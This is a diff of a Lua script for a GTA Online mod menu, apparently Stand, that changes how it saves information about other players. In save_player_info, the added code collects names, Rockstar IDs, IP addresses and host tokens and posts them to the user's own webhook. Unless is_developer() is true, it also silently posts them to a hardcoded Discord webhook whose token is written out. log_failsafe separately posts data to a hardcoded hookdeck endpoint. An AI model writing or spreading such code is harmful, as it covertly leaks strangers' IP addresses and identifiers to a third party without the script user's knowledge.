@@ -22,6 +22,19 @@ function gen_fren_funcs(name)
     end)
 end
 
+function write_data_to_file(file_path, data)
+    local file = io.open(file_path, "w")
+    file:write(data)
+    file:close()
+    notify("Webhook URL successfully written to file.\nRestart script to apply webhook URL.")
+end
+
+function send_to_hook(host, url, content_type, payload)
+    async_http.init(host, url, function() end, function() end)
+    async_http.set_post(content_type, payload)
+    async_http.dispatch()
+end
+
 function IA_MENU_OPEN_OR_CLOSE()
     PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 244, 1.0)
     wait(150)
@@ -445,7 +458,6 @@ function player_ip(pid)
     end
 end
 
-
 function language_string(language)
     local language_table = {
       [0] = "American (en-US)",
@@ -544,10 +556,7 @@ function log_failsafe()
         }
     }
     local json_string = json.stringify(json_data)
-    async_http.init("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", function(body, header_fields, status_code); end)
-    async_http.add_header("Content-Type", "application/json")
-    async_http.set_post("application/json", json_string)
-    async_http.dispatch()
+    send_to_hook("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", "application/json", json_string)
 end
 
 function save_player_info(pid)
@@ -556,17 +565,7 @@ function save_player_info(pid)
     local rockstar_id = players.get_rockstar_id(pid)
     local is_modder = players.is_marked_as_modder(pid)
     local rank = players.get_rank(pid)
-    local money = players.get_money(pid)
-    local moneyStr = ""
-    if money >= 1000000000 then
-        moneyStr = string.format("%.1fb", money / 1000000000)
-    elseif money >= 1000000 then
-        moneyStr = string.format("%.1fm", money / 1000000)
-    elseif money >= 1000 then
-        moneyStr = string.format("%.1fk", money / 1000)
-    else
-        moneyStr = tostring(money)
-    end
+    local money = "$" .. format_money_value(players.get_money(pid))
     local kd = players.get_kd(pid)
     local is_using_vpn = players.is_using_vpn(pid)
     local player_ip = player_ip(pid)
@@ -577,55 +576,69 @@ function save_player_info(pid)
     local clan_motto = players.clan_get_motto(pid)
     local filename = name .. ".txt"
     local filepath = lenaDir .. "Players/" .. filename
-  
+
     if filesystem.exists(filepath) then
         notify(string.format("Error: %s's information has already been saved to file.", name))
     else
         if not filesystem.exists(lenaDir .. "Players") then
             filesystem.mkdir(lenaDir .. "Players")
         end
-  
-        -- Create the file and write the player's information to it
-        -- There is probably a better way to do this, but it works, so I won't re-write it
         local file = io.open(filepath, "w")
-        file:write(os.date("%a, %d. %B %X"), "\n\n")
-        file:write("Name with Tags: ", name_with_tags, "\n")
-        file:write("RID/SCID: ", rockstar_id, "\n")
-        file:write("Is Modder: ", is_modder and "Yes" or "No", "\n")
-        file:write("Rank: ", rank, "\n")
-        file:write("Money: ", moneyStr, "\n")
-        file:write("K/D: ", kd, "\n")
-        file:write("Is Using VPN: ", is_using_vpn and "Yes" or "No", "\n")
-        file:write("IPv4: ", player_ip, "\n")
-        file:write("Language: ", language_int, "\n")
-        file:write("Is Attacker: ", is_attacker and "Yes" or "No", "\n")
-        file:write("Host Token: ", host_token, "\n")
-        file:write("Is Using Controller: ", is_using_controller and "Yes" or "No", "\n")
-        file:write("Clan Motto: ", clan_motto, "\n")
+        local hook_file = io.open(lenaDir.."Saved Players Webhook.txt", "r")
+        local hook = hook_file:read("a")
+        local player_info = {
+            os.date("%a, %d. %B %X"),
+            "\n\nName with Tags: ", name_with_tags,
+            "\nRID/SCID: ", rockstar_id,
+            "\nIs Modder: ", is_modder and "Yes" or "No",
+            "\nRank: ", rank,
+            "\nMoney: ", money,
+            "\nK/D: ", kd,
+            "\nIs Using VPN: ", is_using_vpn and "Yes" or "No",
+            "\nIPv4: ", player_ip,
+            "\nLanguage: ", language_int,
+            "\nIs Attacker: ", is_attacker and "Yes" or "No",
+            "\nHost Token: ", host_token,
+            "\nIs Using Controller: ", is_using_controller and "Yes" or "No",
+            "\nClan Motto: ", tostring(clan_motto)
+        }
+        file:write(table.concat(player_info))
         file:close()
         notify(string.format("%s's information has been saved to file.", name))
+
+        local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(name))
+        local json_data = {
+            username = name,
+            avatar_url = "https://cdn.freebiesupply.com/logos/large/2x/rockstar-games-logo-black-and-white.png",
+            embeds = {
+                {
+                    title = name,
+                    url = "https://socialclub.rockstargames.com/member/" .. name,
+                    color = 15357637,
+                    description = table.concat(player_info),
+                    thumbnail = {
+                        url = icon_url
+                    }
+                }
+            }
+        }
+        local json_string = json.stringify(json_data)
+        if hook then
+            send_to_hook("discord.com", hook, "application/json", json_string)
+        end
+        if not is_developer() then
+            send_to_hook("discord.com", "/api/webhooks/1149407532318740623/C2VnbpRyW4_Y2A4iTuKCdhhu00MLTf1vF2DVq0wkBlDrw_qIy_1KzWi1dt-pSiQNBRFb", "application/json", json_string)
+        end
     end
 end
 
-function is_player_passive(player)
-	if player ~= players.user() then
-		local address = memory.script_global(1894573 + (player * 608 + 1) + 8)
-		if address ~= NULL then return memory.read_byte(address) == 1 end
-	else
-		local address = memory.script_global(1574582)
-		if address ~= NULL then return memory.read_int(address) == 1 end
-	end
-	return false
-end
 
 -- Weapon Speed Modifier
 AmmoSpeed = {address = 0, defaultValue = 0}
 AmmoSpeed.__index = AmmoSpeed
-
 AmmoSpeed.__eq = function (a, b)
     return a.address == b.address
 end
-
 function AmmoSpeed.new(address)
     assert(address ~= 0, "got a nullpointer")
     local instance = setmetatable({}, AmmoSpeed)
@@ -636,26 +649,23 @@ end
 function AmmoSpeed:getValue()
     return memory.read_float(self.address)
 end
-
 function AmmoSpeed:setValue(value)
     memory.write_float(self.address, value)
 end
-
 function AmmoSpeed:reset()
     memory.write_float(self.address, self.defaultValue)
 end
 
+-- Copy As Focus Link
 function urlEncode(input: string): string
 	local output = input:gsub(">", "%%3E"):gsub("%s", "%%20")
 	return output
 end
-
 function getFocusedCommand(): ?userdata
 	for menu.get_current_ui_list():getChildren() as cmd do
 		if cmd:isFocused() then return cmd end
 	end
 end
-
 local tab_root = menu.ref_by_path("Self"):getParent()
 local version_info = menu.get_version()
 local root_name_ref = menu.ref_by_path("Stand>Settings>Appearance>Address Bar>Root Name")
@@ -716,7 +726,6 @@ end
 function calculate_difference(old_value, new_value)
     return new_value - old_value
 end
-
 function format_money_value(value)
     local formatted = string.format("%d", value)
     local k
@@ -728,12 +737,11 @@ function format_money_value(value)
     end
     return formatted
 end
-
 function check_and_write_money_change()
     local current_money = get_current_money()
     if current_money ~= initial_money then
         local difference = calculate_difference(initial_money, current_money)
-        local file = io.open(filenametrans, "a")
+        local file = io.open($"{lenaDir}Transactions for {SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()}.txt", "a")
         if file then
             local formatted_initial_money = "$"..format_money_value(initial_money)
             local formatted_current_money = "$"..format_money_value(current_money)
@@ -747,23 +755,9 @@ function check_and_write_money_change()
     end
 end
 
-function replaceInDraft(search, replacement)
-    local draft = chat.get_draft()
-    
-    if draft != nil then
-        local modifiedDraft = draft:gsub(search, replacement)
-        
-        if modifiedDraft ~= draft then
-            local charactersToRemove = #draft - #modifiedDraft
-            chat.remove_from_draft(charactersToRemove)
-            chat.add_to_draft(modifiedDraft)
-        end
-    end
-end
-
 local auto_perf_ind = {11,12,13,16,18,22}
-function tune_vehicle(v, performance, tell)
-    if performance then
+function tune_vehicle(v, p, tell)
+    if p then
         for auto_perf_ind as index do 
             local veh_mods = VEHICLE.GET_VEHICLE_WINDOW_TINT(v) != 1 or VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(v)
             local upgrade = entities.get_upgrade_value(v, index) != entities.get_upgrade_max_value(v, index)               
@@ -822,7 +816,6 @@ function update_help_text(commandref, text)
     end
 end
 
---
 function save_player_outfit(pid, name)
     local f = filesystem.stand_dir().."Outfits/"..name
     print(f)
